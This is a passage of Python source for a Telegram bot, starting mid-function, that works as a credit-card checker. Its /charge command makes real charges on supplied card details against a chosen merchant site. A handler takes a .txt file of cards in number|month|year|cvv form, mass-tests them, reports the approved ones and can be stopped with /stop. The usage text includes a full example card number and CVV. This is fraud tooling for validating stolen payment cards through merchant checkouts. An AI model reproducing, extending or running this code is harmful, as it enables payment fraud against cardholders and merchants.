            "Usage: /charge <amount> number|month|year|cvv\n"
            "Example: /charge 1.00 5218071175156668|02|26|574"
        )
        return

    amount = context.args[0].strip().lstrip('$')
    try:
        float(amount)
    except ValueError:
        await update.message.reply_text("❌ Invalid amount. Example: /charge 1.00 number|month|year|cvv")
        return

    raw = " ".join(context.args[1:])
    parsed = parse_card(raw)
    if not parsed:
        await update.message.reply_text("❌ Invalid card format. Use: number|month|year|cvv")
        return

    number, month, year, cvv = parsed
    card_display = f"{number[:4]}****{number[-4:]}|{month}|{year}|{cvv}"
    status_msg = await update.message.reply_text(f"💳 Charging ${amount} on {card_display}...\n⚠️ This is a REAL charge.")

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_card_charge, ctx, number, month, year, cvv, amount)

    await status_msg.delete()
    await update.message.reply_html(format_card_result(result))


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ctx = user_sites.get(user_id)

    if not ctx:
        await update.message.reply_text("❌ No site set. Use /setsite https://example.com first.")
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file with one card per line.")
        return

    file = await context.bot.get_file(doc.file_id)
    raw_bytes = await file.download_as_bytearray()
    content = raw_bytes.decode('utf-8', errors='ignore')

    cards = []
    for line in content.splitlines():
        parsed = parse_card(line.strip())
        if parsed:
            cards.append(parsed)

    if not cards:
        await update.message.reply_text("❌ No valid cards found in file.\nFormat: number|month|year|cvv")
        return

    status_msg = await update.message.reply_html(
        f"📂 Found <b>{len(cards)}</b> cards\n"
        f"🌐 Site: {ctx['url']}\n"
        f"⏳ Starting checks..."
    )

    loop = asyncio.get_event_loop()
    approved, declined, errors = [], [], []
    stop_flags.discard(user_id)

    stopped = False
    for i, (number, month, year, cvv) in enumerate(cards, 1):
        if user_id in stop_flags:
            stop_flags.discard(user_id)
            stopped = True
            break

        await status_msg.edit_text(
            f"📂 Mass check — {len(cards)} cards\n"
            f"⏳ Checking {i}/{len(cards)}... | /stop to cancel\n"
            f"✅ {len(approved)} approved | ❌ {len(declined)} declined | ⚠️ {len(errors)} errors",
        )

        result = await loop.run_in_executor(None, check_card_on_ctx, ctx, number, month, year, cvv)

        if result['status'] == 'approved':
            approved.append(result)
            await update.message.reply_html(format_card_result(result))
        elif result['status'] == 'declined':
            declined.append(result)
        else:
            errors.append(result)

    if stopped:
        summary = [
            f"<b>🛑 Mass Check Stopped</b>",
            f"🌐 {ctx['url']}",
            f"📊 {i - 1}/{len(cards)} checked | ✅ {len(approved)} approved | ❌ {len(declined)} declined | ⚠️ {len(errors)} errors",
        ]
    else:
        summary = [
            f"<b>✅ Mass Check Complete</b>",
            f"🌐 {ctx['url']}",
            f"📊 {len(cards)} total | ✅ {len(approved)} approved | ❌ {len(declined)} declined | ⚠️ {len(errors)} errors",
        ]

    if approved:
        summary.append("\n<b>Approved:</b>")
        for r in approved:
            summary.append(f"  <code>{r['card']}</code>")

    await status_msg.edit_text("\n".join(summary), parse_mode='HTML')


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    stop_flags.add(user_id)
    await update.message.reply_text("🛑 Stop signal sent — mass check will halt after the current card.")


def main() -> None:
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("setsite", setsite_command))
    app.add_handler(CommandHandler("site", site_command))
    app.add_handler(CommandHandler("cc", cc_command))
    app.add_handler(CommandHandler("auth", auth_command))
    app.add_handler(CommandHandler("charge", charge_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    logger.info("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
